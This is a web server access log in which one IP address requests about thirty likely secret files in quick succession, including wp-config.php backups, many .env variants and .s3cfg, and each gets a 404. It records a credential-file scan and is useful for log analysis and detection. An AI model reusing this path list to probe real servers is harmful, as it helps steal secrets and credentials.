13.212.104.192 - - [26/Mar/2023:21:35:22 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:23 +0000] "GET /wp-config.php.bk HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:23 +0000] "GET /wp-config.php.orig HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:23 +0000] "GET /wp-config.php.save HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:24 +0000] "GET /wp-config.php_ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:24 +0000] "GET /wp-config.php_bk HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:25 +0000] "GET /wp-config.php_old HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:25 +0000] "GET /wp-config.php_orig HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:25 +0000] "GET /wp-config.php~ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:26 +0000] "GET /.docker/.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:26 +0000] "GET /.docker/laravel/app/.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:27 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:27 +0000] "GET /.env.backup HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:27 +0000] "GET /.env.dev HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:28 +0000] "GET /.env.dist HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:28 +0000] "GET /.env.example HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:29 +0000] "GET /.env.local HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:29 +0000] "GET /.env.save HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:29 +0000] "GET /.env.stage HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:30 +0000] "GET /.env.www HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:30 +0000] "GET /.env_1 HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:31 +0000] "GET /.envs HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:31 +0000] "GET /.env~ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:31 +0000] "GET /.gitlab-ci/.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:32 +0000] "GET /.s3cfg HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:32 +0000] "GET /.vscode/.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:33 +0000] "GET /admin-app/.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:33 +0000] "GET /admin/.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:33 +0000] "GET /alpha/.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.212.104.192 - - [26/Mar/2023:21:35:34 +0000] "GET /api/.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
